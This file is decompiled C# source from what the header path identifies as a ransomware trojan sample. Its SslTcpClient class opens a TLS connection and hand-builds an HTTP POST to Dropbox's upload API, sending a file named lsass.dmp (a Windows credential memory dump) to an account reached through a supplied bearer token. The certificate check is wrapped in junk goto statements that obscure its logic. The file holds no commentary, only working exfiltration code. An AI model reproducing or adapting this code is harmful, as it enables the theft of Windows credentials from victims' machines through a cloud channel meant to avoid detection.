// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp1.SslTcpClient
// Assembly: IMG_203_65_00201, Version=0.0.52.0, Culture=neutral, PublicKeyToken=null
// MVID: 512F8E1C-65FA-4A08-85E3-C51B3E89D23E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-9c36f6b8763377e8d99e2977ab75a9e8395fc76c0bef9452ce04256a388ad2d9.exe

using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace WindowsFormsApp1
{
  public class SslTcpClient
  {
    public static string old;

    public static bool ValidateServerCertificate(
      object sender,
      X509Certificate certificate,
      X509Chain chain,
      SslPolicyErrors sslPolicyErrors)
    {
      if (true)
        goto label_6;
label_3:
      if (false)
        goto label_9;
      else
        goto label_9;
label_6:
      int num1 = sslPolicyErrors == SslPolicyErrors.None ? 1 : 0;
label_7:
      int num2 = num1 != 0 ? 1 : 0;
      bool flag;
      if (true)
      {
        if (num2 != 0)
        {
          flag = true;
          goto label_3;
        }
        else
          num2 = 0;
      }
      flag = num2 != 0;
label_9:
      num1 = flag ? 1 : 0;
      if (true)
        return num1 != 0;
      goto label_7;
    }

    public static void RunClient(string machineName, string project, string token, string content)
    {
      TcpClient tcpClient = new TcpClient(machineName, 443);
      SslStream sslStream = new SslStream((Stream) tcpClient.GetStream(), false, new RemoteCertificateValidationCallback(SslTcpClient.ValidateServerCertificate), (LocalCertificateSelectionCallback) null);
      try
      {
        do
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          sslStream.AuthenticateAsClient(machineName, (X509CertificateCollection) null, SslProtocols.Tls12, false);
        }
        while (false);
      }
      catch (AuthenticationException ex)
      {
        if (ex.InnerException == null)
          ;
        tcpClient.Close();
        return;
      }
      int millisecondsTimeout = 5;
      do
      {
        if (millisecondsTimeout != 0)
        {
          string[] strArray = new string[millisecondsTimeout];
          strArray[0] = "POST /2/files/upload HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36\r\nHost: content.dropboxapi.com\r\nAuthorization: Bearer ";
          strArray[1] = token;
          strArray[2] = "\r\nDropbox-API-Arg: {\"path\": \"/";
          strArray[3] = project;
          strArray[4] = "/lsass.dmp\",\"mode\": \"overwrite\",\"autorename\": false,\"mute\": false,\"strict_conflict\": false}\r\nContent-Type: text/plain; charset=dropbox-cors-hack\r\n";
          string str1 = string.Concat(strArray);
          string str2 = "Content-Length: " + Encoding.UTF8.GetByteCount(content).ToString() + "\r\n\r\n";
          byte[] bytes;
          do
          {
            bytes = Encoding.UTF8.GetBytes(str1 + str2 + content);
          }
          while (false);
          sslStream.Write(bytes, 0, bytes.Length);
          do
          {
            sslStream.Flush();
          }
          while (false);
          millisecondsTimeout = 5000;
        }
      }
      while (millisecondsTimeout == 0 || millisecondsTimeout == 0);
      Thread.Sleep(millisecondsTimeout);
    }
  }
}
